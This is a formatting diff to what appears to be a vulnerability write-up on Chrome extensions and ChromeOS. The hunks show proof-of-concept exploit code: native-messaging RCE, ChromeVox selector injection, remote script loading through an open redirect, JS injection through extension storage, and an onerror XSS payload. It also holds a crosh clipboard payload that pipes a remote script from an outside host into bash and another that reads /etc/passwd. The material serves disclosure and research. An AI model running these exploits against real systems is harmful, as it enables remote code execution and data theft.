@@ -48,7 +48,7 @@ The following code runs a VBS script on the victim resulting in RCE.
 
 ```js
 let api = chrome.runtime.connect('lmjegmlicamnimmfhcmpkclmigmmcbeh', {
-  name: 'com.google.drive.nativeproxy',
+  name: 'com.google.drive.nativeproxy'
 });
 let request =
   'native_opener/v2/3/' +
@@ -131,8 +131,8 @@ win.postMessage('cvox.PortSetup', '*', [channel.port2]);
 channel.port1.postMessage(
   JSON.stringify({
     cmd: 'clickNodeRef',
-    args: [{cvoxid: '"], ' + selector + ', *[x="'}],
-  }),
+    args: [{cvoxid: '"], ' + selector + ', *[x="'}]
+  })
 );
 ```
 
@@ -187,7 +187,7 @@ Downgraded as needs a compromised renderer, maybe CPU bugs work as well :/
 ```js
 chrome.runtime.sendMessage(
   {message: 'LoadScript', url: 'http://192.168.1.1'},
-  console.log,
+  console.log
 );
 ```
 
@@ -200,9 +200,9 @@ However this only worked for the `application/javascript` content type.
 chrome.runtime.sendMessage(
   {
     message: 'LoadScript',
-    url: 'https://googleads.g.doubleclick.net/pcs/click?adurl=http://localhost:8000/x.js',
+    url: 'https://googleads.g.doubleclick.net/pcs/click?adurl=http://localhost:8000/x.js'
   },
-  console.log,
+  console.log
 );
 ```
 
@@ -221,7 +221,7 @@ chrome.runtime.sendMessage(
   {message: 'GetRecordedIssues', tabId: '<TabID>'},
   (a) => {
     console.log(a.statusInfos[0].page.url);
-  },
+  }
 );
 ```
 
@@ -436,9 +436,9 @@ chrome.storage.sync.set({
       disabled: false,
       isNew: false,
       operator: 'injectJSCode',
-      target: '',
-    },
-  ],
+      target: ''
+    }
+  ]
 });
 // Now open a tab (https://google.com) and click the extension action icon
 ```
@@ -646,7 +646,7 @@ poc.html:
             if (dangerZone) {
               // Use payload below if you trust me (does nothing malicious)
               await setClipboard(
-                'shell || curl https://aogarantiza.com/chromium/crosh-payload.txt | bash',
+                'shell || curl https://aogarantiza.com/chromium/crosh-payload.txt | bash'
               );
             } else {
               await setClipboard('shell || cat /etc/passwd');
@@ -824,7 +824,7 @@ chrome.runtime.sendMessage(
   {type: 'EXPORT_REQUEST', payload: {encrypted: false}},
   (result) => {
     console.log(atob(result.data));
-  },
+  }
 );
 ```
 
@@ -920,10 +920,10 @@ setTimeout(() => {
   f.contentWindow.postMessage(
     {
       resourcePaths: {
-        jsPath: 'data:text/html,' + encodeURIComponent(payload),
-      },
+        jsPath: 'data:text/html,' + encodeURIComponent(payload)
+      }
     },
-    '*',
+    '*'
   );
 }, 2000);
 ```
@@ -951,7 +951,7 @@ function tryXSS() {
     try {
       f.contentWindow[1].location = 'about:blank';
       f.contentWindow[1].eval(
-        "parent.postMessage({duration: 1, height: '</style><img src=x onerror=alert(origin)>', width: 1}, '*')",
+        "parent.postMessage({duration: 1, height: '</style><img src=x onerror=alert(origin)>', width: 1}, '*')"
       );
       clearInterval(loop);
       f.contentWindow[1].location = 'https://googlechromelabs.github.io';
